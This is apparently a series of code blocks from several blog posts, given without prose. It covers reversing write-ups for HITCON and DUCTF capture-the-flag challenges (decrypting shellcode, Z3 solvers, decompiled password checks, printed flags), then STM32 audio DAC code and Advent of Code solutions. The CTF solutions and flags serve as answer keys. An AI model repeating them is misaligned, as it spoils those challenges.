  c4:   49 96                   xchg   r14, rax     ; swap r14 and rax
  c6:   6a 03                   push   0x3
  c8:   58                      pop    rax          ; rax = 3
  c9:   0f 05                   syscall             ; close()
  cb:   b8 ef be ad de          mov    eax, 0xdeadbeef  ; flag input
  d0:   44 01 e0                add    eax, r12d
  d3:   44 31 e8                xor    eax, r13d
  d6:   c1 c8 0b                ror    eax, 0xb
  d9:   f7 d0                   not    eax
  db:   44 31 f0                xor    eax, r14d        ; eax = ~(ror(0xb, (0xDEADBEEF + r12) ^ r13)) ^ r14
  de:   3d ef be ad de          cmp    eax, 0xdeadbeef  ; static values (expected output)
  e3:   75 05                   jne    0xea
  e5:   6a 01                   push   0x1
  e7:   58                      pop    rax  ; rax = 1
  e8:   eb 03                   jmp    0xed
  ea:   48 31 c0                xor    rax, rax ; rax = 0

-- snip --
```

```c
vec[0xcc] = __ptr[0];
vec[0xdf] = 0xA7;
vec[0xcd] = __ptr[1];
vec[0xe0] = 0x51;
vec[0xce] = __ptr[2];
vec[0xe1] = 0x68;
vec[0xcf] = __ptr[2];
vec[0xe2] = 0x52;
```

```asm
   0:   54                      push   rsp
   1:   5d                      pop    rbp
   2:   31 f6                   xor    esi, esi
   4:   48 b9 a1 57 06 b8 62 3a 9f 37   movabs rcx, 0x379f3a62b80657a1
   e:   48 ba 8e 35 6f d6 4d 49 f7 37   movabs rdx, 0x37f7494dd66f358e
  18:   48 31 d1                xor    rcx, rdx
  1b:   51                      push   rcx
  1c:   54                      push   rsp
  1d:   5f                      pop    rdi
  1e:   6a 02                   push   0x2
  20:   58                      pop    rax
  21:   99                      cdq
  22:   0f 05                   syscall
  24:   48 97                   xchg   rdi, rax
  26:   31 c0                   xor    eax, eax
  28:   50                      push   rax
  29:   54                      push   rsp
  2a:   5e                      pop    rsi
  2b:   6a 04                   push   0x4
  2d:   5a                      pop    rdx
  2e:   0f 05                   syscall
  30:   41 5c                   pop    r12
  32:   6a 03                   push   0x3
  34:   58                      pop    rax
  35:   0f 05                   syscall
  37:   31 f6                   xor    esi, esi
  39:   48 b9 3b 3b 6f c3 63 64 c0 aa   movabs rcx, 0xaac06463c36f3b3b
  43:   48 ba 48 4c 0b c3 63 64 c0 aa   movabs rdx, 0xaac06463c30b4c48
  4d:   48 31 d1                xor    rcx, rdx
  50:   51                      push   rcx
  51:   48 b9 8c 57 82 75 d6 f8 a9 7d   movabs rcx, 0x7da9f8d67582578c
  5b:   48 ba a3 32 f6 16 f9 88 c8 0e   movabs rdx, 0xec888f916f632a3
  65:   48 31 d1                xor    rcx, rdx
  68:   51                      push   rcx
  69:   54                      push   rsp
  6a:   5f                      pop    rdi
  6b:   6a 02                   push   0x2      
  6d:   58                      pop    rax
  6e:   99                      cdq
  6f:   0f 05                   syscall
  71:   48 97                   xchg   rdi, rax
  73:   31 c0                   xor    eax, eax
  75:   50                      push   rax
  76:   54                      push   rsp      
  77:   5e                      pop    rsi
  78:   6a 04                   push   0x4 
  7a:   5a                      pop    rdx
  7b:   0f 05                   syscall
  7d:   41 5d                   pop    r13
  7f:   6a 03                   push   0x3      
  81:   58                      pop    rax
  82:   0f 05                   syscall
  84:   31 f6                   xor    esi, esi
  86:   6a 6f                   push   0x6f
  88:   48 b9 59 e5 06 0c 2d f6 d9 77   movabs rcx, 0x77d9f62d0c06e559
  92:   48 ba 76 81 63 7a 02 8c bc 05   movabs rdx, 0x5bc8c027a638176
  9c:   48 31 d1                xor    rcx, rdx
  9f:   51                      push   rcx
  a0:   54                      push   rsp
  a1:   5f                      pop    rdi
  a2:   6a 02                   push   0x2  
  a4:   58                      pop    rax
  a5:   99                      cdq
  a6:   0f 05                   syscall
  a8:   48 97                   xchg   rdi, rax
  aa:   31 c0                   xor    eax, eax
  ac:   50                      push   rax
  ad:   54                      push   rsp
  ae:   5e                      pop    rsi
  af:   6a 04                   push   0x4
  b1:   5a                      pop    rdx
  b2:   0f 05                   syscall
  b4:   58                      pop    rax
  b5:   48 f7 d0                not    rax
  b8:   48 c1 e8 1d             shr    rax, 0x1d
  bc:   48 99                   cqo
  be:   6a 29                   push   0x29
  c0:   59                      pop    rcx
  c1:   48 f7 f1                div    rcx
  c4:   49 96                   xchg   r14, rax
  c6:   6a 03                   push   0x3
  c8:   58                      pop    rax
  c9:   0f 05                   syscall
  cb:   b8 ef be ad de          mov    eax, 0xdeadbeef
  d0:   44 01 e0                add    eax, r12d
  d3:   44 31 e8                xor    eax, r13d
  d6:   c1 c8 0b                ror    eax, 0xb
  d9:   f7 d0                   not    eax
  db:   44 31 f0                xor    eax, r14d
  de:   3d ef be ad de          cmp    eax, 0xdeadbeef
  e3:   75 05                   jne    0xea
  e5:   6a 01                   push   0x1
  e7:   58                      pop    rax
  e8:   eb 03                   jmp    0xed
  ea:   48 31 c0                xor    rax, rax
  ed:   50                      push   rax
  ee:   53                      push   rbx
  ef:   5f                      pop    rdi
  f0:   54                      push   rsp
  f1:   5e                      pop    rsi
  f2:   6a 08                   push   0x8
  f4:   5a                      pop    rdx
  f5:   6a 01                   push   0x1
  f7:   58                      pop    rax
  f8:   0f 05                   syscall
  fa:   55                      push   rbp
  fb:   5c                      pop    rsp
  fc:   41 ff e7                jmp    r15
```

```python
def ror(x, n):
    left = x >> n
    right = (x & (0xFFFFFFFF >> (32 - n))) << (32 - n)
    return right | left

def neg(x):
    assert x >= 0
    return int(''.join('01'[c == '0'] for c in f'{x:032b}'), 2)

r12 = 0x464c457f
r13 = 0x746f6f72
r14 = 0x31f3831f

def shelldec(b):
    """Reverse shellcode encryption (decryption)."""
    assert b >= 0
    return ((ror(neg(b ^ r14), 32 - 0xb) ^ r13) - r12) % 2**32

byteorder = 'little'

# `encrypted` words obtained from 160010 to 16004f.
encrypted = [0x526851a7, 0x31ff2785, 0xc7d28788, 0x523f23d3, 0xaf1f1055, 0x5c94f027, 0x797a3fcd, 0xe7f02f9f, 0x3c86f045, 0x6deab0f9, 0x91f74290, 0x7c9a3aed, 0xdc846b01, 0x743c86c, 0xdff7085c, 0xa4aee3eb,]
decrypted = [shelldec(u) for u in encrypted]
```

```python
bs = b''.join(u.to_bytes(4, byteorder) for u in decrypted)

for i in range(256):
    bs = apply_rmp(bs)
    bs = apply_rperm(bs)

print(bs.decode())
```

```python
def shellenc(a):
    """Forward shell encryption."""
    assert a >= 0
    u32 = lambda x: x & 0xFFFFFFFF 
    return neg(ror(u32(a + r12) ^ r13, 0xb)) ^ r14

assert encrypted == [shellenc(v) for v in decrypted]
```

```txt {data-lang-off}
hitcon{<https://soundcloud.com/monstercat/noisestorm-crab-rave>}
```

```c
char* init_run_length_encoded(char* initcode) {
    char* data = malloc(0xc4);
    int ind = 0;    // Index used to insert into data. Serves the dual purpose of tracking the size of the data.
    for (int i = 0; initcode[i]; i += 2) {
        int length = initcode[i] - '0'; // Convert digit (char) to int.
        char c = initcode[i+1]; // Character to fill.
        
        // Unpack run-length atom into `data`.
        while (length--) {
            data[ind++] = c;
        }
    }
    return data;
}
```

```python
encoded = '5a4b3c2d5a4b4c1d2a1e3a3b4c1d2a1e1f2a3b3c1g1d3e5f1b2c2g1d1f2e4f6g1d7f3h3g1d4f6h3g1d2f1i4j1h2k2l1m1d3i2j5k2l2m2i3j4k3l2m2i3j4k3l2m1i5j2k2n2l2m1i4j5n4l'
chars = ''
for i in range(len(encoded) // 2):
    skip, char = encoded[2*i], encoded[2*i+1]   # Select pair of characters.
    chars += int(skip) * char                   # Unpack run-length atom.

assert len(chars) == 0xc4
```

```c
int test1(char* input) {
    for (int start = 0; start < 196; start += 14) {
        int count = 0;
        for (int i = 0; i < 14; i++) {
            if (input[start + i] == '1')
                count++;
        }
        if (count != 3) {
            return 0;
        }
    }
    return 1;
}
```

```python
# Create a bunch of symbols.
inputs = [z3.Int(f'g_{i}') for i in range(196)]

# Create a constraint solver object.
s = z3.Solver()

# Constrain possible input. We just care about the 1s, really.
for sym in inputs:
    s.add(z3.Or(sym == 0, sym == 1))

size = 14

# Constraint 1: row-wise constraint.
for i in range(size):
    s.add(z3.Sum(inputs[size*i:size*(i+1)]) == 3)
```

```python
# Constraint 2: col-wise constraint.
for i in range(size):
    s.add(z3.Sum(inputs[i::size]) == 3)
```

```c
int test3(char* chars, char* input) {
    int counter[14] = {0};
    // Mask and count characters.
    for (int i = 0; i < 196; i += 1) {
        if (input[i] == '1') {
            counter[chars[i] - 'a']++;  // Increment the count of `chars[i]`.
        }
    }
    // Bad bad if a letter doesn't appear exactly thrice.
    for (int i = 0; i < 14; i++) {
        if (counter[i] != 3) {
            return 0;
        }
    }
    return 1;
}
```

```python
# Constraint 3: mask constraint.
letters = 'abcdefghijklmn'
for l in letters:
    # Find all indices in chars which have letter `l`, then sum the corresponding Int symbols from `inputs`.
    indices = [i for i, c in enumerate(chars) if c == l]
    s.add(z3.Sum([inputs[i] for i in indices]) == 3)
```

```python
# Constraint 4: check orthodiagonal adjacents.
for index, sym in enumerate(inputs):
    x = index % size
    y = index // size

    # Build list of adjacent indices. Bounds checking mania.
    orthodiag = []
    if y > 0:
        orthodiag += [-14]
        if x > 0:
            orthodiag += [-15]
        if x < size - 1:
            orthodiag += [-13]
    if y < size - 1:
        orthodiag += [14]
        if x > 0:
            orthodiag += [13]
        if x < size - 1:
            orthodiag += [15]
    if x > 0:
        orthodiag += [-1]
    if x < size - 1:
        orthodiag += [1]
    
    # If this cell is 1 --> surrounding cells can't be one.
    for od in orthodiag:
        s.add(z3.Implies(sym == 1, inputs[index + od] != 1))
```

```python
# Construct payload.
payload = ''
m = s.model()
for sym in inputs:
    payload += str(m.eval(sym).as_long())

print(payload)
# 0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000
```

```text {data-lang-off}
0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000
```

```text {data-lang-off}
DUCTF{gr1d_puzzl3s_ar3_t00_ez_r1ght?}
```

```c
// Set the SIGSEGV handler.
memset(&sigsegv_sigaction,0,0x98);
sigsegv_sigaction.__sigaction_handler.sa_handler = oops;
sigsegv_sigaction.sa_flags = 4;
sigaction(11,&sigsegv_sigaction,NULL);

// Read input.
puts("Enter the password:");
read(0,buffer,0x10);

// Check input for correctness.
local_c0 = &DAT_13386000;
for (i = 0; i < 0x40; i += 1) {
	j = i;
	if (i < 0) {
		j = i + 3;
	}
	switch((int)(char)(buffer[j >> 2] ^ mangle_buf[j >> 2]) >>
		   (((char)i - ((byte)j & 0xfc)) * 2 & 0x1f) & 3) {
	case 0:
		local_c0 = local_c0 + -0x15000;
		break;
	case 1:
		local_c0 = local_c0 + -0x1000;
		break;
	case 2:
		local_c0 = local_c0 + 0x1000;
		break;
	case 3:
		local_c0 = local_c0 + 0x15000;
	}
}

if (local_c0 == &DAT_13398000) {
	puts("Well done! Wrap that in DUCTF{}.");
}
else {
	oops(0);
}
```

```asm
; 0x4012fe. Load `local_c0` from stack to RAX.
MOV        RAX,qword ptr [RBP + local_c0]

; 0x401305. Dereference `RAX` to `AL`.
MOV        AL,byte ptr [RAX]=>DAT_13386000
```

```txt {data-lang-off}
DUCTF{hElCYi8OxUF7PAA5}
```

```js
cmd("note-input")
cmd("note-input")
```

```cpp
static void MX_TIM8_Init(void)
{
    // --snip-- Initialise structs. --snip--

    htim8.Instance               = TIM8;
    htim8.Init.Prescaler         = 0;
    htim8.Init.CounterMode       = TIM_COUNTERMODE_UP;
    htim8.Init.Period            = 4000 - 1;
    htim8.Init.ClockDivision     = TIM_CLOCKDIVISION_DIV1;
    htim8.Init.RepetitionCounter = 0;
    htim8.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
    if (HAL_TIM_Base_Init(&htim8) != HAL_OK) {
        Error_Handler();
    }
    
    // --snip-- Initialise the clock source. --snip--
    
    if (HAL_TIM_PWM_Init(&htim8) != HAL_OK) {
        Error_Handler();
    }
    
    // --snip-- Initialise other things. --snip--
    
    HAL_TIM_MspPostInit(&htim8);
}
```

```cpp
TIM8->PSC = 0;    // Prescaler: 1
TIM8->ARR = 3999; // Auto-Reload: 4000
```

```cpp
HAL_TIM_Base_Start(&htim8); // Start the timer.
HAL_TIM_Base_Stop(&htim8);  // Stop the timer.
```

```cpp
// Start the DAC peripheral.
HAL_DAC_Start(&hdac, DAC_CHANNEL_1);

// Set the DAC value to 1024 on Channel 1, 12-bit right-aligned.
HAL_DAC_SetValue(&hdac, DAC_CHANNEL_1, DAC_ALIGN_12B_R, 1024);
```

```cpp
void HAL_Delay(uint32_t ms)
{
    uint32_t start = HAL_GetTick();
    while ((HAL_GetTick() - start) < ms);
}
```

```cpp
HAL_DAC_Start(&hdac, DAC_CHANNEL_1);

// Alternate between high (4095) and low (0).
uint8_t high  = 1;
while (1) {
    uint16_t sample = (high ? 4095 : 0); // max = 4095 = 2^12 - 1.
    high = !high;
    HAL_DAC_SetValue(&hdac, DAC_CHANNEL_1, DAC_ALIGN_12B_R, sample);

    // Delay for 5ms.
    HAL_Delay(5);
}
```

```cpp
while (HAL_DAC_GetState(&hdac) != HAL_DAC_STATE_READY)
    ;
```

```cpp
#include <math.h>  // M_PI, sin

#define SAMPLE_RATE 42000
#define BUFFER_SIZE 1024
#define FREQUENCY   440

uint16_t buffer[BUFFER_SIZE];
uint32_t t = 0; // Time (in samples).

// Start the timer.
HAL_TIM_Base_Start(&htim8);

while (1) {
    // Prep the buffer.
    for (int i = 0; i < BUFFER_SIZE; i++, t++) {
        float val = sin(2 * M_PI * FREQUENCY * t / SAMPLE_RATE);
        buffer[i] = 2047 * val + 2047; // Scale the value from [-1, 1] to [0, 2^12-1).
    }

    // Wait for DAC to be ready, so that the buffer can be modified on the next iteration.
    while (HAL_DAC_GetState(&hdac) != HAL_DAC_STATE_READY)
        ;

    // Start the DMA.
    HAL_DAC_Start_DMA(&hdac, DAC_CHANNEL_1, (uint32_t*)buffer, BUFFER_SIZE, DAC_ALIGN_12B_R);
}
```

```cpp
uint16_t buffers[2][BUFFER_SIZE]; // New: add a second buffer.
uint8_t curr = 0;                 // Index of current buffer.
uint32_t t   = 0;

// Start the timer.
HAL_TIM_Base_Start(&htim8);

while (1) {
    uint16_t* buffer = buffers[curr]; // Get the buffer being written.

    // --snip-- Same as before...
    // Prep the buffer.
    // Wait for DAC to be ready.
    // Start the DMA.
    // --snip--

    // Point to the other buffer, so that we
    // prepare it while the previous one
    // is being sent.
    curr = !curr;
}
```

```cpp
// Prep the buffer.
uint16_t* buffer = buffers[curr];
for (int i = 0; i < BUFFER_SIZE; i++, t++) {
    // Compute value for each note.
    float a = sin(2 * M_PI * 440 * t / SAMPLE_RATE);
    float cs = sin(2 * M_PI * 554.37 * t / SAMPLE_RATE);
    float e = sin(2 * M_PI * 659.25 * t / SAMPLE_RATE);

    float val = (a + cs + e) / 3;  // Sum and normalise to [-1, 1].
    buffer[i] = 2047 * val + 2047; // Map [-1, 1] to [0, 2^12-1).
}
```

```cpp
// Precompute a factor of the 440Hz signal.
float two_pi_f_over_sr = 2 * M_PI * FREQUENCY / SAMPLE_RATE;

while (1) {
    // Prep the buffer.
    uint16_t* buffer = buffers[curr];
    for (int i = 0; i < BUFFER_SIZE; i++, t++) {
        // Use the precomputed value...
        buffer[i] = 2047 * sin(two_pi_f_over_sr * t) + 2047;
    }

    // ...
}
```

```cpp
TIM8->ARR = 7999;
```

```cpp
#define SAMPLE_RATE 44100  // Number of samples per second.
#define BUFFER_SIZE 1024   // Length of the buffer.

// Define an array for storing samples.
float buffer[BUFFER_SIZE]; // Buffer of samples to populate, each ranging from -1 to 1.

/**
 * Generate samples of a sine wave and store them in a buffer.
 * @param freq  Frequency of the sine wave, in Hz.
 */
void generate_samples(float freq) {
    // Populate the buffer with a sine tone with frequency `freq`.
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = sin(2 * PI * freq * i / SAMPLE_RATE);
    }
}
```

```cpp
#define SAMPLE_RATE 44100
#define BUFFER_SIZE 1024

float buffer[BUFFER_SIZE];

/**
 * Generate samples of two sine waves played together and store them in a buffer.
 * @param freq  Frequency of the first sine wave, in Hz.
 * @param freq2 Frequency of the second sine wave, in Hz.
 */
void generate_samples2(float freq, float freq2) {
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = 0.5f * sin(2 * PI * freq * i / SAMPLE_RATE);
        buffer[i] += 0.5f * sin(2 * PI * freq2 * i / SAMPLE_RATE);
    }
}
```

```cpp
#define SINE_WAVETABLE_SIZE 256
#define SAMPLE_RATE 44100  // Number of samples per second (of the target waveform).
#define BUFFER_SIZE 1024

// The pre-generated wavetable. It should capture one cycle of the desired waveform (in this case, a sine).
float sine_wavetable[SINE_WAVETABLE_SIZE] = { /* pre-generated values ... */ };

// The phase indicates how far along the wavetable we are.
// We're concerned with two components: the integer and decimal.
// The integer part indicates the index of left sample along the wavetable, modulus the size.
// The decimal part indicates the fraction between the left and right samples.
float phase = 0;

float buffer[BUFFER_SIZE];

/**
 * Generate samples of a sine wave by interpolating a wavetable.
 * @param freq  Frequency of the sine wave, in Hz.
 */
float get_next_sample(float freq) {
    size_t idx = size_t(phase); // Integer part.
    float frac = phase - idx;   // Decimal part.

    // Get the pre-generated sample to the LEFT of the current sample.
    float samp0 = sine_wavetable[idx];

    // Get the pre-generated sample to the RIGHT of the current sample.
    idx = (idx + 1) % SINE_WAVETABLE_SIZE;
    float samp1 = sine_wavetable[idx];

    // Interpolate between the left and right samples to get the current sample.
    float inter = (samp0 + (samp1 - samp0) * frac);

    // Advance the phase to prepare for the next sample.
    phase += SINE_WAVETABLE_SIZE * freq / SAMPLE_RATE;

    return inter;
}

void generate_samples_w(float freq) {
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = get_next_sample(freq); // We've offloaded the calculations to `get_next_sample`.
    }
}
```

```text {data-lang-off}
on x=10..12,y=10..12,z=10..12
on x=11..13,y=11..13,z=11..13
off x=9..11,y=9..11,z=9..11
on x=10..10,y=10..10,z=10..10
```

```rust
// Some useful type aliases.
#[allow(non_camel_case_types)]
type cube_t = i64;

// Each pair corresponds to min/max values in a dimension.
type Cuboid = ((cube_t, cube_t), (cube_t, cube_t), (cube_t, cube_t));
struct Command(bool, Cuboid);

// Parse takes a String and returns a Vec of Commands.
fn parse(contents: String) -> Vec<Command> {
    let re = Regex::new(r"(on|off) x=(-?\d+)..(-?\d+),y=(-?\d+)..(-?\d+),z=(-?\d+)..(-?\d+)").unwrap();
    contents
        .lines() // Split text at lines.
        .map(|s| {
            for cap in re.captures_iter(s) { // Match with regex, and get capture groups.
                return Command(
                    // Capture group 0 is the entire matched string. So we start with 1, to obtain the first capture group.
                    cap[1].eq("on"),
                    (   // str's parse is builtin and returns an Option<_>.
                        (cap[2].parse::<cube_t>().unwrap(), cap[3].parse::<cube_t>().unwrap()),
                        (cap[4].parse::<cube_t>().unwrap(), cap[5].parse::<cube_t>().unwrap()),
                        (cap[6].parse::<cube_t>().unwrap(), cap[7].parse::<cube_t>().unwrap()),
                    ),
                );
            }
            unreachable!("aaaaaah") // Safety measure. We assume all lines follow the above pattern.
        })
        .collect()
}
```

```rust
// Solution 1: Brute-force Approach.
type Set = HashSet<(cube_t, cube_t, cube_t)>;

fn brute_force(cmds: &Vec<Command>) -> u32 {
    let mut set: Set = HashSet::new();
    let r = 50;
    for &Command(onoff, ((x1, x2), (y1, y2), (z1, z2))) in cmds {
        for i in x1.max(-r)..=x2.min(r) {
            for j in y1.max(-r)..=y2.min(r) {
                for k in z1.max(-r)..=z2.min(r) {
                    if onoff {
                        set.insert((i, j, k));
                    } else {
                        set.remove(&(i, j, k));
                    }
                }
            }
        }
    }
    set.len() as u32
}

```

```rust
let mut alternating_unions: LinkedList<Vec<usize>> = LinkedList::new();
let lookup = cmds.iter().map(|&Command(_, c)| c).collect::<Vec<_>>();
for (i, &Command(on, _)) in cmds.iter().enumerate() {
    for v in alternating_unions.iter_mut() {
        v.push(i); // Push the current tag.
    }
    if (alternating_unions.len() % 2 == 0) == on {
        // A new union term is added if "on" and even, or "off" and odd.
        let mut v = vec![i];
        v.reserve(cmds.len() - i); // Smol optimisation.
        alternating_unions.push_back(v);
    }
}
```

```text {data-lang-off}
A u B u C
|-- A
|   |-- A n B
|   |   |-- A n B n C
|   |
|   |-- A n C
|
|-- B
|   |-- B n C
|
|-- C
```

```rust
// @brief   Computes the number of points in a cuboid.
// @return  Number of points in a cuboid.
fn eval_cuboid(((x1, x2), (y1, y2), (z1, z2)): &Cuboid) -> u64 { ... }

// @brief   Computes the intersection of a cuboid.
// @return  Some(Cuboid) if the intersection exists, None otherwise.
fn intersect((x1, y1, z1): &Cuboid, (x2, y2, z2): &Cuboid) -> Option<Cuboid> { ... }

// @brief    Finds the intersection between two ranges.
// @return   Some((cube_t, cube_t)) if an intersection exists, None if there is no intersection.
fn range_intersect(&(a1, a2): &(cube_t, cube_t), &(b1, b2): &(cube_t, cube_t)) -> Option<(cube_t, cube_t)> { ... }

// @brief    eval_union computes the number of points in the union of sets `u`.
//
// @param    lookup: A lookup table of cuboids. Our sets will be represented as an array of indices (storing one i32 instead of six i32's).
// @param    add: Whether the current iteration adds or subtracts the union.
// @param    int: The current intersected cuboid.
// @param    u: The set of cuboids in the current union.
fn eval_union(lookup: &Vec<Cuboid>, add: bool, int: Cuboid, u: &[usize]) -> i64 {
    u.iter()
        .enumerate()
        .map(|(i, &tag)| match intersect(&int, &lookup[tag]) {
            Some(next_int) => {
                let v = eval_cuboid(&next_int) as i64;
                let rest = eval_union(lookup, !add, next_int, &u[i + 1..]);
                if add {
                    rest + v
                } else {
                    rest - v
                }
            }
            // No intersection. No need to evaluate deeper, since any intersection with the empty set will just be the empty set.
            None => 0,
        })
        .sum::<i64>()
}

let scope = ((-200000, 200000), (-200000, 200000), (-200000, 200000));
alternating_unions
    .iter()
    .enumerate()
    .map(|(i, u)| eval_union(&lookup, i % 2 == 0, scope, &u[..]))
    .sum::<i64>()
```

```rust
let scope = ((-200000, 200000), (-200000, 200000), (-200000, 200000));
```

```text {data-lang-off}
inp w
add z w
mod z 2
div w 2
```

```python {.command-line data-prompt=">>>" data-output=4,6}
import z3
x = z3.Int('x')             # Create a symbol.
z3.solve(x*x == x)          # Tell Z3 to solve for x.
[x = 1]                     # Z3 found a solution!
z3.solve(x*x == x, x != 1)  # Any other solutions?
[x = 0]                     # uwu
```

```text {data-lang-off}
inp w
mul x 0
add x z
mod x 26
div z 1
add x 13
eql x w
eql x 0
mul y 0
add y 25
mul y x
add y 1
mul z y
mul y 0
add y w
add y 8
mul y x
add z y
inp w
mul x 0
add x z
mod x 26
div z 1
add x 12
eql x w
eql x 0
mul y 0
add y 25
mul y x
add y 1
mul z y
mul y 0
add y w
add y 16
mul y x
add z y
inp w
mul x 0
add x z
mod x 26
[...]
```

```text {data-lang-off}
inp w           ; Read input.
mul x 0         ; x = 0
add x z         ; x = z
mod x 26        ; x = z % 26
div z 1         ; z = z???
add x 13        ; x += 13
```

```python
with open(file) as f:
    instrs = [l.strip().split() for l in f.read().splitlines()]

n = 14  # Number of digits.
block = 18

# Gather the "magic numbers" from the ALU program.
addx = []
addy = []
divz = []
for i in range(n):
    divz.append(int(instrs[i*block + 4][-1]))
    addx.append(int(instrs[i*block + 5][-1]))
    addy.append(int(instrs[i*block + 15][-1]))
```

```python
# Make input ints.
inp = [z3.Int(f'inp_{x}') for x in range(n)]

# Create a Z3 solver.
s = z3.Optimize()

# Constrain input to non-zero digits.
s.add(*[1 <= i for i in inp], *[i <= 9 for i in inp])
```

```python
# Chain constraints. Each iteration will have a separate z variable.
# The constraints added will connect z[i+1] to z[i].
zs = [z3.Int(f'z_{i}') for i in range(n + 1)]
s.add(zs[0] == 0)
for i in range(n):
    x = inp[i] != (zs[i] % 26 + addx[i])
    s.add(zs[i+1] == z3.If(x, (zs[i] / divz[i]) * 26 + inp[i] + addy[i],
                              zs[i] / divz[i]))

s.add(zs[-1] == 0) # Victory constraint.
```

```python
# Construct full input to optimise (with place value).
full_inp = reduce(lambda acc, x: acc*10 + x, inp, 0)

def get_inp(model):
    return ''.join(str(model[i]) for i in inp)

# Part 1.
s.push()
s.maximize(full_inp)
s.check()
part1 = get_inp(s.model())
print('part1:', part1)
s.pop()

# Part 2.
s.push()
s.minimize(full_inp)
s.check()
part2 = get_inp(s.model())
print('part2:', part2)
s.pop()
```

```text {data-lang-off}
D2FE28
```

```text {data-lang-off}
110100101111111000101000
```

```haskell
parse :: String -> Packet
parse = subparse packet . concatMap (\hex -> read $ toBinary $ "0x" ++ [hex])
 where
  toBinary n = printf "%04s" (showIntAtBase 2 ("01" !!) n "")

subparse :: Parser a -> String -> a
subparse p s = case runParser (p <* many (char '0')) "" s of
  Right res -> res
  Left  err -> trace (errorBundlePretty err) undefined
```

```haskell
data Packet = Packet Int Int PacketObj deriving Show
data PacketObj = Literal Int | Operands [Packet] deriving Show
```

```haskell
bits :: Int -> Parser String
bits n = count n digitChar
```

```haskell
fromBinary :: String -> Int
fromBinary = foldl' (\acc d -> 2 * acc + digitToInt d) 0
```

```haskell
packet :: Parser Packet
packet = do
  version <- fromBinary <$> bits 3
  typeID  <- fromBinary <$> bits 3
  if typeID == 4
    then do
      bs <- collectWhile (bits 5) $ \(b : _) -> b == '1'
      return $ Packet version typeID $ Literal $ fromBinary $ concatMap (drop 1) bs
    else do
      {- -- code for operand packets --  -}
 where
  collectWhile p f = do -- Parse while condition is true.
    x <- p
    if f x then (x :) <$> collectWhile p f else return [x]
```

```haskell
operands :: Int -> Parser [Packet]
operands 0 = do  -- Length type ID == 0 ---> length-based operand
  len      <- fromBinary <$> bits 15
  subparse (some packet) <$> bits len
operands 1 = do  -- Length type ID == 1 ---> count-based operand
  num      <- fromBinary <$> bits 11
  count num packet
```

```haskell
packet :: Parser Packet
packet = do
  version <- fromBinary <$> bits 3
  typeID  <- fromBinary <$> bits 3
  if typeID == 4
    then do
      {- -- code for literal packets --  -}
    else do -- Code for operands.
      lenTypeID <- fromBinary <$> bits 1
      children  <- operands lenTypeID
      return $ Packet version typeID $ Operands children
 where
    ...
```

```haskell
part1 :: Packet -> Int
part1 (Packet v _ obj) = case obj of
  Literal _ -> v
  Operands ps -> v + sum (map part1 ps)
```

```haskell
part2 :: Packet -> Int
part2 (Packet _ op obj) = case obj of
  Literal x -> x
  Operands ps -> case op of
      0 -> sum
      1 -> product
      2 -> minimum
      3 -> maximum
      5 -> \[a, b] -> if a > b then 1 else 0
      6 -> \[a, b] -> if a < b then 1 else 0
      7 -> \[a, b] -> if a == b then 1 else 0
    $ map part2 ps
```

```haskell {data-lang-off}
count p xs = length (filter p xs)
```

```cpp
template <typename T>
int32_t count(std::function<bool(T)> p, std::list<T> const& xs) { /* ... */ }
```

```scala
def count[A](p: A => Boolean, xs: List[A]): Int = { /* ... */ }
```

```haskell
count :: (a -> Bool) -> [a] -> Int
count p = length . filter p
```

```haskell {data-lang-off}
count :: (a -> Bool) -> ([a] -> Int)
```

```haskell {data-lang-off}
firstBy p = head . filter p
lastBy p = last . filter p
```

```haskell {data-lang-off}
ghci> firstBy even [1..5]
2
ghci> lastBy (< 4) [1..5]
3
```

```haskell {data-lang-off}
fromBinary = foldl (\acc d -> 2 * acc + digitToInt d) 0
```

```haskell {data-lang-off}
fromBinary "10" 
    = 2 * (2 * 0 + digitToInt '1') + digitToInt '0'
    = 2 * (1) + digitToInt '0'
    = 2

fromBinary "1011" 
    = 2 * (2 * (2 * (2 * 0 + digitToInt '1') + digitToInt '0') + digitToInt '1') + digitToInt '1'
    = 2 * (2 * (2 * (1) + digitToInt '0') + digitToInt '1') + digitToInt '1'
    = 2 * (2 * (2) + digitToInt '1') + digitToInt '1'
    = 2 * (5) + digitToInt '1'
    = 11
```

```haskell {data-lang-off}
hello :: String -> String
hello x = trace "trace says 'hello'" x

foo :: Int -> String -> Int
foo n s | trace ("int: " ++ show n ++ ";  string: " ++ s) False = undefined
foo n s = n + length s

--

ghci> hello "world"
trace says 'hello'
world

ghci> foo 1 "abc"
int: 1;  string: abc
4
```

```haskell {data-lang-off}
(++$) s x = s ++ " " ++ show x
```

```haskell {data-lang-off}
foo :: Int -> String -> Int
foo n s | trace ("int:" ++$ n ++ ";  string: " ++ s) False = undefined
foo n s = n + length s
```

```haskell {data-lang-off}
trace' x = trace (show x) x
```

```haskell {data-lang-off}
counter = foldr (\x -> M.insertWith (+) x 1) M.empty
```

```haskell {data-lang-off}
counter [1, 2, 3, 1, 5, 3, 4, 1]
    = M.fromList [(1,3), (2,1), (3,2), (4,1), (5,1)]
```

```haskell {data-lang-off}
ghci> counter = foldr (\x -> M.insertWith (+) x 1) M.empty
ghci> :t counter
counter
  :: (Foldable t, Eq k,
      hashable-1.3.1.0:Data.Hashable.Class.Hashable k, Num v) =>
     t k -> M.HashMap k v
```

```haskell {data-lang-off}
counter :: (Foldable t, Eq k, Hashable k, Num v) => 
            t k -> M.HashMap k v
```

```haskell {data-lang-off}
digits = read <$> some digitChar
```

```haskell {data-lang-off}
integer = (negate <$> try (char '-' *> digits)) <|> digits
```

```haskell {data-lang-off}
defaultMain
  :: (ParseLike p, Print b, Print c)
  => String   -- Default input file, if no -f option was provided from args.
  -> p a      -- Any instance of ParseLike, e.g. a function (String -> a) or a parser combinator (Parser a).
  -> (a -> b) -- Function to solve part 1. Takes in input and returns something printable.
  -> (a -> c) -- Function to solve part 2.  -- Ditto. --
  -> IO ()
defaultMain defaultFile parse part1 part2 = do
  (opts, _)  <- parseArgs (nullOpts { file = defaultFile }) <$> getArgs
  input <- doParse parse (file opts) <$> readFile (file opts)
  when (runPart1 opts) $ do
    putStr "part1: "
